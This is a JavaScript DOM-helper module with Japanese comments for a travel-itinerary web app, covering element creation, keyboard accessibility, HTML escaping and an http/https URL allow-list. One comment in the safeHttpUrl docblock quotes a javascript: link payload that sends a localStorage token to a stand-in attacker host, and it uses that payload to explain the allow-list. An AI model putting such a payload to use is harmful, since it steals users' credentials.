/**
 * DOM 組み立ての小さな共通部品。
 * calendar.js に置いていたが、地図・詳細シート・Phase B の持ち物リストなど
 * カレンダーと関係のない画面からも使うため独立させた。
 */

/**
 * 要素を 1 つ作る。text を渡した場合は textContent で入れるので、
 * 文字列をエスケープする必要がない（innerHTML を使わない）。
 */
export function el(tag, cls, text) {
  const node = document.createElement(tag);
  if (cls) node.className = cls;
  if (text != null) node.textContent = text;
  return node;
}

/**
 * キーボードでも到達・実行できるようにする。
 * カレンダーのブロック／ピルは見た目上カード状で <button> の既定スタイルと
 * 相性が悪いため、role="button" + tabindex + keydown で最小限に済ませる。
 * 地図のロケーション一覧行でも同じパターンが必要になるため共通化している。
 */
export function makeSelectable(node, ev, label, onSelect) {
  node.tabIndex = 0;
  node.setAttribute("role", "button");
  node.setAttribute("aria-label", `${ev.title}、${label}`);
  const activate = () => runSelect(ev, onSelect);
  node.addEventListener("click", activate);
  node.addEventListener("keydown", (e) => {
    if (e.key === "Enter" || e.key === " " || e.key === "Spacebar") {
      e.preventDefault();
      activate();
    }
  });
}

/**
 * onSelect の呼び出しを、どのイベントで失敗したかが分かる形にする。
 *
 * リスナーの中で例外が出ると、ブラウザのコンソールにはスタックだけが残り
 * 「どの予定をクリックしたのか」は残らない。ID とタイトルを添えて記録してから
 * 投げ直す（握り潰さない ── 潰すと画面もコンソールも無反応になり、
 * 押し損ねたのかアプリが壊れたのかが利用者にも開発者にも区別できない）。
 *
 * 利用者向けの表示は呼び出し側の責任。schedule.js の openDetail が
 * 例外を受け取ってシートにエラーを出す。
 */
function runSelect(ev, onSelect) {
  try {
    onSelect(ev);
  } catch (error) {
    console.error(
      `makeSelectable: 選択の処理に失敗しました（${ev?.id ?? "id なし"} / ${ev?.title ?? ""}）`,
      error
    );
    throw error;
  }
}

/**
 * innerHTML に文字列を差し込むときのエスケープ。
 *
 * 属性値に入れる場合も考えて " を必ず変換する（`src="${...}"` のような
 * 書き方では、" 1 文字で属性から抜け出して onerror= を生やせてしまう）。
 * ' は属性を必ずダブルクォートで囲む規約にしているので対象外だが、
 * 呼び出し側の書き間違いを保険で吸収できるよう併せて変換する。
 *
 * Phase A の events.json はリポジトリに手で書いたデータなので実害はないが、
 * Phase B ではブラウザで入力した文字列を Contents API 経由で書き戻す。
 * そのトークンを持つページ自身で描画する以上、ここは常に通す。
 */
const ESCAPES = {
  "&": "&amp;",
  "<": "&lt;",
  ">": "&gt;",
  '"': "&quot;",
  "'": "&#39;",
};

export function escapeHtml(value) {
  return String(value).replace(/[&<>"']/g, (c) => ESCAPES[c]);
}

/**
 * href に載せてよい URL だけを通す許可リスト。
 *
 * escapeHtml は & < > " ' しか変換しない。
 * javascript:fetch('https://evil.example/?t='+localStorage.token) には
 * そのどれも含まれないので、href="${escapeHtml(url)}" は素通しになり、
 * リンクをクリックした瞬間にスクリプトとして実行される。
 * エスケープはクォートからの脱出を防ぐだけで、スキームは見ていない。
 *
 * Phase A の events.json はリポジトリ管理下なので到達しないが、Phase B では
 * この URL がブラウザから編集できるようになる。しかもリポジトリ書き込み権限の
 * トークンを持つページ自身が描画する。エスケープの後ろにもう 1 枚必要。
 *
 * 相対 URL も弾く。旅程データの url は外部サイトへの参照（target="_blank"）に
 * 限る規約なので、相対パスが入っているのはデータの書き間違い。
 *
 * @returns {string|null} http / https の絶対 URL ならその文字列、それ以外は null
 */
const SAFE_SCHEMES = new Set(["http:", "https:"]);

export function safeHttpUrl(value) {
  if (typeof value !== "string" || !value.trim()) return null;
  let parsed;
  try {
    // URL パーサに判定させる。前後の空白・制御文字・大文字小文字・
    // "java\tscript:" のような細工はここで正規化される
    parsed = new URL(value);
  } catch {
    return null;
  }
  if (!SAFE_SCHEMES.has(parsed.protocol)) return null;
  // 元の文字列ではなく正規化済みの href を返す。検査した文字列と href に
  // 書き込む文字列を必ず同一にするため（"htt\tps://…" のようにパーサが
  // 空白を落とす入力で、検査と描画の解釈がずれるのを防ぐ）
  return parsed.href;
}
